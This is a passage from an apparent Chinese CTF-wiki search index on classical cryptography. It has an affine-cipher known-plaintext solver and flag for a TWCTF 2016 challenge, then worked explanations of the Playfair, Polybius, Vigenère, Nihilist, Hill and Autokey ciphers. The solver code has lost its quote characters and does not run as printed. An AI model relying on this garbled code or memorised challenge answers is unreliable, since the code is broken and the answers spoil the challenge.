\u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002  \u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b  import   gmpy  key   =   ****CENSORED****************  flag   =   TWCTF{*******CENSORED********}  f   =   open ( encrypted ,   r )  data   =   f . read () . strip ( \\n )  encrypted   =   [ int ( data [ i : i   +   2 ],   16 )   for   i   in   range ( 0 ,   len ( data ),   2 )]  plaindelta   =   ord ( flag [ 1 ])   -   ord ( flag [ 0 ])  cipherdalte   =   encrypted [ 1 ]   -   encrypted [ 0 ]  a   =   gmpy . invert ( plaindelta ,   251 )   *   cipherdalte   %   251  b   =   ( encrypted [ 0 ]   -   a   *   ord ( flag [ 0 ]))   %   251  a_inv   =   gmpy . invert ( a ,   251 )  result   =    for   c   in   encrypted : \n     result   +=   chr (( c   -   b )   *   a_inv   %   251 )  print   result   \u7ed3\u679c\u5982\u4e0b  \u279c  TWCTF2016-super_express git: ( master )  \u2717 python exploit.py\nTWCTF { Faster_Than_Shinkansen! }", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/", 
            "text": "\u5bf9\u4e8e\u591a\u8868\u66ff\u6362\u52a0\u5bc6\u6765\u8bf4\uff0c\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd\u51e0\u4e4e\u4e0d\u518d\u4fdd\u6301\u539f\u6765\u7684\u9891\u7387\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u53ea\u80fd\u901a\u8fc7\u5bfb\u627e\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u5e94\u7684\u5f31\u70b9\u8fdb\u884c\u7834\u89e3\u3002\n\n\nPlayfair\n\n\n\u539f\u7406\n\n\nPlayfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a\n\n\n\n\n\u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002\n\n\n\u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002\n\n\n\u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002\n\n\n\u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002\n\n\n\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002\n\n\n\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002\n\n\n\n\n\n\n\n\n\u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002\n\n\n\u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97\n\n\nP L A Y F\nI R E X M\nB C D G H\nK N O Q S\nT U V W Z\n\n\n\n\n\u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump\n\n\nHI DE TH EG OL DI NT HE TR EX ES TU MP\n\n\n\n\n\u5c31\u4f1a\u5f97\u5230\n\n\nBM OD ZB XD NA BE KU DM UI XM MO UV IF\n\n\n\n\n\u5de5\u5177\n\n\n\n\nCAP4\n\n\n\n\nPolybius\n\n\n\u539f\u7406\n\n\nPolybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868\n\n\n\n\n\n\n\n\n\n\n1\n\n\n2\n\n\n3\n\n\n4\n\n\n5\n\n\n\n\n\n\n\n\n\n\n1\n\n\nA\n\n\nB\n\n\nC\n\n\nD\n\n\nE\n\n\n\n\n\n\n2\n\n\nF\n\n\nG\n\n\nH\n\n\nI/J\n\n\nK\n\n\n\n\n\n\n3\n\n\nL\n\n\nM\n\n\nN\n\n\nO\n\n\nP\n\n\n\n\n\n\n4\n\n\nQ\n\n\nR\n\n\nS\n\n\nT\n\n\nU\n\n\n\n\n\n\n5\n\n\nV\n\n\nW\n\n\nX\n\n\nY\n\n\nZ\n\n\n\n\n\n\n\n\n\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002\n\n\n\u53e6\u4e00\u79cd\u5bc6\u7801\u8868\n\n\n\n\n\n\n\n\n\n\nA\n\n\nD\n\n\nF\n\n\nG\n\n\nX\n\n\n\n\n\n\n\n\n\n\nA\n\n\nb\n\n\nt\n\n\na\n\n\nl\n\n\np\n\n\n\n\n\n\nD\n\n\nd\n\n\nh\n\n\no\n\n\nz\n\n\nk\n\n\n\n\n\n\nF\n\n\nq\n\n\nf\n\n\nv\n\n\ns\n\n\nn\n\n\n\n\n\n\nG\n\n\ng\n\n\nj\n\n\nc\n\n\nu\n\n\nx\n\n\n\n\n\n\nX\n\n\nm\n\n\nr\n\n\ne\n\n\nw\n\n\ny\n\n\n\n\n\n\n\n\n\u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002\n\n\nA D F G X \u7684\u7531\u6765\uff1a\n\n\n\n\n1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002\n\n\n\n\n\u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002\n\n\n\u5de5\u5177\n\n\n\n\nCrypTool\n\n\n\n\nVigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002\n\n\n\n\n\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\n\n\n\u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto\n\n\n\n\n\u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002\n\n\n\n\n\n\n\n\n\u660e\u6587\n\n\nc\n\n\no\n\n\nm\n\n\ne\n\n\ng\n\n\nr\n\n\ne\n\n\na\n\n\nt\n\n\nw\n\n\na\n\n\nl\n\n\nl\n\n\n\n\n\n\n\n\n\n\n\u5bc6\u94a5\n\n\nc\n\n\nr\n\n\ny\n\n\np\n\n\nt\n\n\no\n\n\nc\n\n\nr\n\n\ny\n\n\np\n\n\nt\n\n\no\n\n\nc\n\n\n\n\n\n\n\n\n\u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587\n\n\n\n\n\u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto\n\u5bc6\u6587\uff1aefkt zferrltzn\n\n\n\n\n\u7834\u89e3\n\n\n\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002\n\n\n\u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002\n \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002\n\n\n\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a\n\n\n\u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB\n\n\n\n\n\u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a\n\n\n\u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB\n\n\n\n\n\u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a\n\n\n\u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD\n\n\n\n\n\u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002\n\n\n\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http://\nwww.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/\n\u3002\n\n\n\u5de5\u5177\n\n\n\n\n\u5df2\u77e5\u5bc6\u94a5\n\n\nPython \u7684 pycipher \u5e93\n\n\n\u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher\n\n\nCAP4\n\n\n\n\n\n\n\u672a\u77e5\u5bc6\u94a5\n\n\nVigen\u00e8re Cipher Codebreaker\n\n\nVigenere Solver\n \uff0c\u4e0d\u591f\u5b8c\u5584\u3002\n\n\n\n\n\n\n\n\nNihilist\n\n\n\u539f\u7406\n\n\nNihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002\n\n\n\u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09\n- \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635\n- \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635\n- \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165\n- \u5b57\u6bcd i \u548c j \u7b49\u4ef7\n\n\n\n\n\n\n\n\n\n\n1\n\n\n2\n\n\n3\n\n\n4\n\n\n5\n\n\n\n\n\n\n\n\n\n\n1\n\n\nh\n\n\ne\n\n\nl\n\n\no\n\n\nw\n\n\n\n\n\n\n2\n\n\nr\n\n\nd\n\n\na\n\n\nb\n\n\nc\n\n\n\n\n\n\n3\n\n\nf\n\n\ng\n\n\ni / j\n\n\nk\n\n\nm\n\n\n\n\n\n\n4\n\n\nn\n\n\np\n\n\nq\n\n\ns\n\n\nt\n\n\n\n\n\n\n5\n\n\nu\n\n\nv\n\n\nx\n\n\ny\n\n\nz\n\n\n\n\n\n\n\n\n\u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a\n\n\na -\n M[2,3] -\n 23\nt -\n M[4,5] -\n 45\n\n\n\u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\n\n\n\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a\n\n\n23 -\n M[2,3] -\n a\n45 -\n M[4,5] -\n t\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9\n\n\n\n\n\u7eaf\u6570\u5b57\n\n\n\u53ea\u5305\u542b 1 \u5230 5\n\n\n\u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002\n\n\n\n\nHill\n\n\n\u539f\u7406\n\n\n\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \n\\mathbb{Z}_{26}^{n}\n\\mathbb{Z}_{26}^{n}\n \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50\n\n\n\u660e\u6587\uff1aACT\n\n\n\n\n\u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002\n\n\n\n\n\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\n\n\n\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\n\n\n\n\n\u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a\n\n\n\n\n\n\\begin{bmatrix}\n6 \n 24 \n 1\\\\\n13 \n 16 \n 10\\\\\n20 \n 17 \n 15\n\\end{bmatrix}\n\n\n\n\n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}\n\n\n\n\n\n\u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a\n\n\n\n\n\n\\begin{bmatrix}\n6 \n 24 \n 1\\\\\n13 \n 16 \n 10\\\\\n20 \n 17 \n 15\n\\end{bmatrix}\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n67\\\\\n222\\\\\n319\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n15\\\\\n14\\\\\n7\n\\end{bmatrix}\n\\bmod 26\n\n\n\n\n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n67\\\\\n222\\\\\n319\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n15\\\\\n14\\\\\n7\n\\end{bmatrix}\n\\bmod 26\n\n\n\n\n\n\u5bc6\u6587\u5373\u4e3a\n\n\n\u5bc6\u6587\uff1aPOH\n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttp://www.practicalcryptography.com/ciphers/hill-cipher/\n\n\nCAP4\n\n\nCryptool\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a\n\n\n\n\n\u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09\n\n\n\u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10\n\n\n\u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6.\n\n\n\n\n\u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b\n\n\n1 4 7\n2 5 8\n3 6 10\n\n\n\n\n\u6700\u540e\u7684\u7ed3\u679c\u4e3a \noverthehillx\n\u3002\n\n\nAutokeyCipher\n\n\n\u539f\u7406\n\n\n\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a\n\n\n\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5173\u952e\u8bcd\uff1aCULTURE\n\n\n\n\n\u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a\n\n\nCULTURE THE QUICK BROWN FOX JUMPS OVER THE\n\n\n\n\n\u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a\n\n\n\u5bc6\u6587\n\n\nVBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK\n\n\n\n\n\u5de5\u5177\n\n\n\n\n\u5df2\u77e5\u5173\u952e\u8bcd\n\n\nPython \u7684 pycipher \u5e93\n\n\n\n\n\n\n\u672a\u77e5\u5173\u952e\u8bcd\n\n\nhttp://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/\n\n\ntools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002", 
            "title": "\u591a\u8868\u4ee3\u6362\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#playfair", 
            "text": "", 
            "title": "Playfair"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_1", 
            "text": "Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a   \u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002  \u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002  \u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002  \u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002  